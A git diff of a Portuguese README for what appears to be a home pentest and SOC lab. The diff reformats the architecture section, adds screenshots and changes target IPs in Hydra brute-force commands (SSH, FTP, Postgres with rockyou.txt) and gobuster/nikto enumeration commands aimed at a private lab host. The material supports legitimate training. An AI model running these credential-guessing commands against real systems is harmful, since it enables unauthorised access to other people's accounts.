@@ -22,7 +22,8 @@ O ambiente integra:
 
 ---
 
-## Arquitetura do Ambiente
+<details>
+<summary><h2><b>Clique aqui para visualizar a arquitetura do projeto</b></h2></summary>
 
 • Host: Windows  
 • WSL2 - ambiente ofensivo
@@ -68,7 +69,7 @@ O ambiente integra:
 - 16 GB RAM  
 - 4+ núcleos de CPU  
 - SSD
-
+</details>
 ---
 
 ## Deploy Completo do Ambiente
@@ -210,11 +211,16 @@ nmap -sV -p80 --script http-enum,http-methods,http-title 192.168.12.130
 
 ## Ataques de Autenticação com Hydra
 
+<img width="844" height="251" alt="image" src="https://github.com/user-attachments/assets/e6c5f533-13ac-4b23-8066-f94dbfafbc82" />
+
 ```bash
-hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.12.130
-hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.12.130
-hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.12.130 postgres
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.12.100
+hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.12.100
+hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.12.100 postgres
 ```
+
+## Perspectiva SOC:
+<img width="810" height="154" alt="image" src="https://github.com/user-attachments/assets/8e942d35-f897-408d-833f-ca97fb3342f5" />
 
 ---
 
@@ -234,7 +240,7 @@ use auxiliary/scanner/postgres/postgres_login
 
 ```bash
 nikto -h http://192.168.12.130
-gobuster dir -u http://192.168.12.130 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://192.168.12.100 -w /usr/share/wordlists/dirb/common.txt
 ```
 
 ---
